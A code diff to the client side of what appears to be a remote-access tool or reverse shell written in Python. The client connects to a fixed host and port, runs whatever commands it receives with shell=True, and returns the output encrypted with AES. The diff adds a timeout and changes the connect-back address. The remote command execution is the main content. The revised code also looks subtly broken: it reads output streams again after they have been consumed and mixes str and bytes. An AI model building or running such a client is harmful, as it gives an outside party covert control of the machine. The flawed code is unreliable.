@@ -142,20 +142,32 @@ class Client(Thread):
                     self.conn.send(encrypt_client(output, self.AES_KEY))
                 except Exception as e:
                     print(e)
-                    CMD = subprocess.Popen(command.decode('ISO-8859-1', errors='ignore'), shell=True,
-                                           stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE
-                                           )
-                    print(CMD)
-                    self.conn.send(
-                        encrypt_client(
-                            str(len(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))).encode(
-                                'ISO-8859-1', errors='ignore'), self.AES_KEY))
-                    self.conn.send(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))
+                    try:
+                        CMD = subprocess.Popen(command.decode('ISO-8859-1', errors='ignore'), shell=True,
+                                               stdout=subprocess.PIPE,
+                                               stderr=subprocess.PIPE
+                                               )
+                        print(CMD)
+                        output, errors = CMD.communicate(timeout=1)
+                        new_output = output + errors
+                        self.conn.send(
+                            encrypt_client(
+                                str(len(encrypt_client(new_output + CMD.stdout.read() + CMD.stderr.read(),
+                                                       self.AES_KEY))).encode(
+                                    'ISO-8859-1', errors='ignore'), self.AES_KEY))
+                        self.conn.send(encrypt_client(CMD.stdout.read() + CMD.stderr.read(), self.AES_KEY))
+                    except subprocess.TimeoutExpired:
+                        new_output = ''
+                        self.conn.send(
+                            encrypt_client(
+                                str(len(encrypt_client(new_output,
+                                                       self.AES_KEY))).encode(
+                                    'ISO-8859-1', errors='ignore'), self.AES_KEY))
+                        self.conn.send(encrypt_client(new_output, self.AES_KEY))
 
 
 def main():
-    client = Client("10.0.0.18", 9999)
+    client = Client("127.0.0.1", 9999)
     client.run()
 
 
